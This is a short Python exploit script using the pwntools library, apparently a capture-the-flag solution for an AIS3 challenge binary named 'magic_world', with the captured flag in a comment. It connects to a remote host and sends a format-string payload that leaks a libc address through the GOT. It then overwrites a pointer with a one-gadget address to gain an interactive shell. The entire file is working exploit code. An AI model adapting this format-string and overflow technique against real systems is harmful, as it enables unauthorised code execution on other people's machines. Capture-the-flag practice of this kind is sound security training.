#!/usr/bin/env python
from pwn import *

# AIS3{m1gRatlon_&_b0f_13_Qu1t3_3asY!!!}

e , l = ELF( './magic_world' ) , ELF( './libc-2.19.so' )

host , port = '104.199.235.135' , 2114
y = remote( host , port )

context.arch = 'amd64'

y.sendlineafter( ':' , str( 1 ) )
p = '%p' * 8 + 'yuawn%s'
p = p.ljust( 0x20 , '\x00' ) + p64( e.got['__libc_start_main'] )

y.sendafter( ':' , p )

y.recvuntil( 'yuawn' )

l.address = u64( y.recv(6).ljust(8,'\x00') ) - l.symbols['__libc_start_main']
success( 'libc -> %s' % hex( l.address ) )

y.sendlineafter( ':' , str( 2 ) )

one = 0x46428

p = p64( l.address + one ) * 2 + '\x60'

y.sendafter( ':' , p )

y.interactive()